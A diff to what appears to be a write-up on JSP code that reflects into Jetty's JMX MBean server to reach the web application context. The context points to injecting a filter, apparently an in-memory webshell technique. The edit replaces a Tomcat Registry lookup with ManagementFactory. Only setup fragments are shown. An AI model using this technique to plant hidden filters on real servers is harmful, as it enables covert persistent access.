@@ -22,7 +22,7 @@ getConext.jsp
 ```java
 <%
     try{
-        JmxMBeanServer jmxMBeanServer = (JmxMBeanServer) Registry.getRegistry(null, null).getMBeanServer();
+        JmxMBeanServer jmxMBeanServer = (JmxMBeanServer) ManagementFactory.getPlatformMBeanServer();
         // 获取mbsInterceptor
         Field field = Class.forName("com.sun.jmx.mbeanserver.JmxMBeanServer").getDeclaredField("mbsInterceptor");
         field.setAccessible(true);
@@ -80,11 +80,10 @@ Object webAppContext = field.get(namedObject.getObject());
 <%@ page import="com.sun.jmx.mbeanserver.NamedObject" %>
 <%@ page import="java.util.Set" %>
 <%@ page import="javax.management.ObjectName" %>
-<%@ page import="org.apache.tomcat.util.modeler.Registry" %>
 
 <%
     try{
-        JmxMBeanServer jmxMBeanServer = (JmxMBeanServer) Registry.getRegistry(null, null).getMBeanServer();
+        JmxMBeanServer jmxMBeanServer = (JmxMBeanServer) ManagementFactory.getPlatformMBeanServer();
         Field field = Class.forName("com.sun.jmx.mbeanserver.JmxMBeanServer").getDeclaredField("mbsInterceptor");
         field.setAccessible(true);
         Object mbsInterceptor = field.get(jmxMBeanServer);
@@ -330,14 +329,13 @@ prependFilterMapping.invoke(servletHandler, filterMapping);
 <%@ page import="com.sun.jmx.mbeanserver.NamedObject" %>
 <%@ page import="java.util.Set" %>
 <%@ page import="javax.management.ObjectName" %>
-<%@ page import="org.apache.tomcat.util.modeler.Registry" %>
 <%@ page import="java.lang.reflect.Method" %>
 <%@ page import="sun.misc.BASE64Decoder" %>
 <%@ page import="java.util.EnumSet" %>
 
 <%
     try{
-        JmxMBeanServer jmxMBeanServer = (JmxMBeanServer) Registry.getRegistry(null, null).getMBeanServer();
+        JmxMBeanServer jmxMBeanServer = (JmxMBeanServer) ManagementFactory.getPlatformMBeanServer();
         Field mbsInterceptorF = Class.forName("com.sun.jmx.mbeanserver.JmxMBeanServer").getDeclaredField("mbsInterceptor");
         mbsInterceptorF.setAccessible(true);
         Object mbsInterceptor = mbsInterceptorF.get(jmxMBeanServer);
